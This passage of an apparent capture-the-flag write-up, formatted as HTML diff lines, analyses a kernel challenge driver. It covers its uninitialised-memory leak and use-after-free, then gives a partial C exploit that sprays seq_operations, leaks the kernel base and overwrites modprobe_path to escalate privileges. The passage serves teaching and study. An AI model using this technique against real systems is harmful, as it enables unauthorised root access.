+</span></span><span class="line"><span class="cl">    <span class="nf">raw_spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is the <code>read</code> handler of the <code>kcipher-buf</code> device. Essentially, this function will encrypt the <code>cipher_struct-&gt;text</code> before returning it to us.</p>
+<p>The <code>do_encode</code> function is quite straightforward. It will encrypt the text using an encryption scheme based on <code>cipher_struct-&gt;cipher_mode</code>. For example, mode <code>0</code> is a <code>rot</code> cipher, which increases our text by the given <code>cipher_key</code>. Mode <code>1</code> is a <code>xor</code> cipher, which xors our text with the given <code>cipher_key</code>.</p>
+<p>Based on the above disassembly, we can identify a bug that allows us to trigger a leak.</p>
+<p>The first bug occurs during the allocation of a chunk for <code>text</code>, it uses <code>kmalloc</code> (which doesn&rsquo;t clear the content). Coupled with <code>strncpy</code>, we can allocate a chunk without clearing its content by passing <code>null</code> bytes when calling <code>cipher_write</code>. We can simply use <code>rot</code> as our encryption method. So, when we call <code>cipher_read</code> to retrieve the chunk contents, we can easily recover its original contents.</p>
+<p>As for the second bug, one of our teammates (enigmatrix) informed us that there is a bug during the initialization of <code>kcipher-buf</code>.</p>
+<p>Notice that if we set the <code>cipher_mode</code> (first 4 bytes) to a value larger than 3, the allocated chunk <code>v5</code> (which is the <code>private_data</code>) will be freed, but the file will still be active. This means that when we interact with the <code>kcipher-buf</code> device, the <code>cipher_struct</code> of the device will be a freed chunk. Hence, there is a Use-After-Free bug here.</p>
+<h3 id="solution">Solution</h3>
+<p>Now that we&rsquo;ve identified the bugs, let&rsquo;s proceed to the exploitation. Our first step is to obtain a leak of a kernel address, and we can use the first bug to do this.</p>
+<p>We first spray the <code>seq_operations</code> object (which has a size of <code>0x20</code>). The <code>seq_operations</code> struct contains a pointer to the kernel address. Therefore, if we somehow free this chunk and then it gets reused by <code>cipher_write</code> when allocating <code>text</code>, we can easily get the leak by exploiting the first bug. Here are the sequences:</p>
+<ul>
+<li>Spray <code>seq_operations</code> and free them.</li>
+<li>Open <code>/dev/kcipher</code> and call <code>device_ioctl</code> to initialize a new <code>kcipher-buf</code> file (we&rsquo;ll call this <code>k1</code>). Set the <code>cipher_mode</code> to <code>rot</code> so that we can easily decrypt it.</li>
+<li>Call <code>cipher_write</code> with size <code>0x20</code> and an empty string. It will reuse the freed <code>seq_operations</code> chunk, which contains a kernel address.
+<ul>
+<li>Hence, <code>cipher_struct-&gt;text</code> will contain a kernel address.</li>
+</ul>
+</li>
+<li>Call <code>cipher_read</code>, and we&rsquo;ll get the encrypted <code>text</code>.</li>
+<li>Decrypt it, and we&rsquo;ll get a leak.</li>
+</ul>
+<p>Now that we have the leak, it&rsquo;s time to exploit the second bug. Based on the disassembly, the <code>private_data</code> chunk size is <code>0x60</code>. Our idea is to create a <code>0x60</code> chunk with <code>cipher_write</code>, so that we have an overlapping chunk between <code>text</code> and <code>private_data</code>.</p>
+<p>Here&rsquo;s a short summary (detailed explanations can be found in the script comment):</p>
+<ul>
+<li>After obtaining the leak, open a new <code>kcipher-buf</code> via <code>device_ioctl</code> (we&rsquo;ll call this <code>k2</code>). However, this time, set an invalid <code>cipher_mode</code>, so that <code>k2-&gt;private_data</code> will be freed by the code.</li>
+<li>Now, with <code>k1</code>, create a new <code>text</code> chunk with size <code>0x60</code>. This chunk (<code>k1-&gt;private_data-&gt;text</code>) will overlap with <code>k2-&gt;private_data</code>.</li>
+<li>Now that we have overlapping chunks, the goal is to carefully craft <code>k2-&gt;private_data</code> so that we can execute arbitrary writes via the <code>cipher_read</code> of the <code>k2</code> file.
+<ul>
+<li>We also have arbitrary write because we will be able to set the <code>private_data-&gt;text</code> stored pointer to any address that we want.</li>
+</ul>
+</li>
+<li>However, due to <code>strncpy</code>, we can&rsquo;t easily craft <code>k2-&gt;private_data</code> via <code>k1-&gt;private_data-&gt;text</code>, as there are a lot of null bytes that we need to craft a valid <code>private_data</code>.
+<ul>
+<li>My teammate (sampriti) suggested that we can easily bypass this by encrypting our payload. So, when we decrypt it with <code>cipher_read</code>, the payload will be converted back to the original value (which is our fake <code>private_data</code>). For example:
+<ul>
+<li>Let&rsquo;s say we set the <code>cipher_mode</code> to <code>rot</code> and the <code>cipher_key</code> to <code>0x30</code>. Then, if we want to have a payload, let&rsquo;s say <code>0x0040</code>, we can set our payload to <code>0xd010</code>. So, when we encrypt it, the payload will be reverted back to <code>0x0040</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>After successfully crafting <code>k2-&gt;private_data</code>, we can simply set <code>modprobe_path</code> as <code>k2-&gt;private_data-&gt;text</code>, then attempt to overwrite it byte by byte with <code>cipher_read</code>.</li>
+</ul>
+<p>Below is the full script with detailed explanation.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/msg.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/userfaultfd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define modprobe_path kbase + 0x8a83a0
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kbase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fatal</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Helper method during debugging
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">print_data</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Try to print data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">fmt_str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34;0x%04x: 0x%016lx&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fmt_str</span> <span class="o">=</span> <span class="s">&#34; 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">decrypt_helper</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">enc</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">uint</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-=</span> <span class="n">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Based on observation in gdb, the inode file priv structure is like this:
+</span></span></span><span class="line"><span class="cl"><span class="cm">    typedef struct {
+</span></span></span><span class="line"><span class="cl"><span class="cm">      uint cipher_mode;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      uint cipher_key;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      int64_t size;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      char* text;
+</span></span></span><span class="line"><span class="cl"><span class="cm">      void* spinlock;
+</span></span></span><span class="line"><span class="cl"><span class="cm">    } cipher_struct;
+</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/kcipher&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;open(</span><span class="se">\&#34;</span><span class="s">/dev/kcipher</span><span class="se">\&#34;</span><span class="s">)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Spray seq_operations
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">spray</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span> <span class="o">|</span> <span class="n">O_NOCTTY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">spray</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Get Leak
+</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Initialize kcipher inode device
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cipher_key</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cipher_mode</span> <span class="o">=</span> <span class="p">(</span><span class="n">cipher_key</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// Set cipher_key to 0x30, cipher_mode to 0 (rot). Why do we need to rot it? It will be explained later.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">cipher_fd</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xedbeef00</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cipher_mode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] cipher_fd = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cipher_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// First bug: 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Calling kmalloc doesn&#39;t clear its content. We call write(cipher_fd, buf, 0x20) to trigger kmalloc(0x20).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Then, because the cipher_write used strncpy, the allocated chunk&#39;s content won&#39;t be overwritten with our buf,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// because buf is empty.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// So, after this write() call, the cipher_fd-&gt;priv-&gt;text will contains seq_operations struct leftover. 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="n">cipher_fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Call read(), and the cipher_fd-&gt;priv-&gt;text contents will be encrypted via rot(0x30). So, we need to subtract it first
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">read</span><span class="p">(</span><span class="n">cipher_fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">decrypt_helper</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">cipher_key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">print_data</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="n">kbase</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x15b870</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] kbase = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] modprobe_path = 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Overwrite modprobe_path
+</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// There is a UAF bug during creating the inode device. Assigning cipher_mode larger than 4 will free the cipher_fd_2-&gt;priv,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// but the inode will remain active due to the bug in device_ioctl. So, cipher_fd_2-&gt;priv is a freed chunk (UAF).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">cipher_mode</span> <span class="o">=</span> <span class="mh">0x000000005</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xedbeef00</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cipher_mode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">cipher_fd_2</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] cipher_fd_2 = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cipher_fd_2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// With the write, create a decrypted fake_priv with size 0x60, so that when the write trigger kmalloc(0x60),
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// it will reside in the previous freed priv (cipher_fd_2-&gt;priv).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// After the write() call, technically we now have overlapping chunk, where cipher_fd-&gt;priv-&gt;text  == cipher_fd_2-&gt;priv. 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Now, the plan is we want to make the cipher_fd_2-&gt;priv-&gt;text text pointed to the modprobe_path, then overwrite it with read().
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// To do that, we can simply interact with the write(cipher_fd) to create a fake priv.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Now, this is the reason why we set cipher_fd-&gt;priv-&gt;cipher_mode to rot and key to 0x30. The fake priv contains a lot of null bytes,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// which won&#39;t work because the write() use strncpy. So, we&#39;re going to decrypt the original payload first, so that it won&#39;t contain null bytes.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// Then, we encrypt it with read(cipher_fd), so that the fake_priv back to the original payload that we want (And with this, we can write null bytes).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// We&#39;re going to overwrite the first 5 bytes of modprobe_path from &#34;/sbin&#34; to &#34;/tmp/&#34;.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// To do that, we&#39;re going to modify the fake_priv 5 times, by using xor with the correct key, so that the content of fake_priv-&gt;text (which is modprobe_path),
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// will be changed to our chosen string via xor.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">src</span> <span class="o">=</span> <span class="s">&#34;/sbin&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="s">&#34;/tmp/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prev_key</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">5</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">fake_priv_data</span><span class="p">[</span><span class="mh">0x60</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
